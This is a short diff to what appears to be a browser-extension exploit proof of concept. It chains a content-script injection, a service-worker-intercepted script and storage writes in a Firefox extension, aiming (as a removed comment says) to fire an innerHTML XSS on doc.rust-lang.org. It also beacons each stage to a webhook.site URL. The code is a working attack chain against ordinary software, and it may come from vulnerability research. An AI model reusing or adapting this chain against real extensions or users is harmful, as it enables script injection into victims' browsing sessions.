@@ -6,10 +6,12 @@
     async function run() {
       fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived', { keepalive: true });
 
-      // 1. Wait for cs.js to inject on our origin, run SW import, and send updateLastUrl to background.js
-      await new Promise(r => setTimeout(r, 2500));
+      // Wait 3 seconds to ensure cs.js injects <script type="module">,
+      // SW intercepts jsxss.js, wrappedJSObject calls default export,
+      // and updateLastUrl message writes payload to 'previous' in background storage.
+      await new Promise(r => setTimeout(r, 3000));
 
-      // 2. Open options iframe to reset activateOn back to the real origin
+      // Reset activateOn back to real origin
       const iframe = document.createElement('iframe');
       iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
       document.body.appendChild(iframe);
@@ -20,7 +22,7 @@
 
         fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=reset_and_redirecting', { keepalive: true });
 
-        // 3. Wait for storage write, then navigate to target to fire innerHTML XSS
+        // Give storage time to write activateOn back before navigating to real site
         setTimeout(() => {
           window.location.href = 'https://doc.rust-lang.org/stable/std/';
         }, 2000);
